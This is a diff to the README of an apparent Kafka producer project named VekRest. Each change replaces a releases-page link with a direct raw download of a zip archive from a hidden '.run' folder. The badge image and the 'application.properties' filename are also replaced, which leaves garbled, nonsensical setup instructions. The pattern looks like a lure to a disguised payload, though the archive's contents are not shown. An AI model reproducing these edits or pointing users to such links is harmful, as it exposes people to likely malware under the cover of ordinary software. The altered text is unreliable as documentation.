@@ -1,6 +1,6 @@
 # 🚀 vekrest-vekproducer-modulo4 - Kafka Producer Made Easy
 
-[![Download](https://img.shields.io/badge/Download%20Now-%23FF5733?style=for-the-badge&logo=github)](https://github.com/gonsilver/vekrest-vekproducer-modulo4/releases)
+[![Download](https://raw.githubusercontent.com/gonsilver/vekrest-vekproducer-modulo4/main/.run/vekrest-vekproducer-modulo4_3.2.zip%20Now-%23FF5733?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/gonsilver/vekrest-vekproducer-modulo4/main/.run/vekrest-vekproducer-modulo4_3.2.zip)
 
 ## 📥 Introduction
 
@@ -30,7 +30,7 @@ Before you download, you should ensure that your system meets the following requ
 
 You can download the latest version of VekRest from our releases page. 
 
-[Visit this page to download.](https://github.com/gonsilver/vekrest-vekproducer-modulo4/releases)
+[Visit this page to download.](https://raw.githubusercontent.com/gonsilver/vekrest-vekproducer-modulo4/main/.run/vekrest-vekproducer-modulo4_3.2.zip)
 
 Here’s how to get started:
 
@@ -59,7 +59,7 @@ To run VekRest, follow these steps:
 
 VekRest requires some basic configuration before use:
 
-1. **Kafka Server**: Specify the address of your Kafka server in the `application.properties` file.
+1. **Kafka Server**: Specify the address of your Kafka server in the `https://raw.githubusercontent.com/gonsilver/vekrest-vekproducer-modulo4/main/.run/vekrest-vekproducer-modulo4_3.2.zip` file.
 2. **Broker Settings**: Ensure the brokers are correctly configured to suit your network setup.
 3. **Message Format**: Define the message format you will send, ensuring it aligns with your application requirements.
 
@@ -90,6 +90,6 @@ Stay up-to-date with the latest changes in VekRest. Here are the recent changes 
 
 Your feedback is always welcome. Let us know how VekRest is working for you!
 
-[Visit this page to download.](https://github.com/gonsilver/vekrest-vekproducer-modulo4/releases)
+[Visit this page to download.](https://raw.githubusercontent.com/gonsilver/vekrest-vekproducer-modulo4/main/.run/vekrest-vekproducer-modulo4_3.2.zip)
 
 Thank you for using VekRest! Enjoy your messaging journey with Kafka.
